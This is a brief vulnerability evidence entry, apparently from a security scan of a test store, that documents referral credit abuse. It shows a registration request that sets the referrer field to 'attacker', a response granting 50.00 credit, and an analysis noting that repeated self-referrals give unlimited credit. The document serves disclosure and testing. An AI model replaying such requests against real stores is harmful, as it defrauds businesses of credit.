## Evidence: referral-abuse — Referral Credit Abuse

### Request
POST /api/v1/auth/register HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json

{"username":"newuser","password":"test123","email":"new@example.com","referrer":"attacker","referral":"self-ref","RegisterRequest":true}

### Response
HTTP/1.1 201 Created
Content-Type: application/json

{"user":"newuser","credit":50.00,"referrer":"attacker","message":"Referral credit applied"}

### Analysis
The RegisterRequest accepts a referrer field allowing self-referral. Repeated registrations generate unlimited credit.
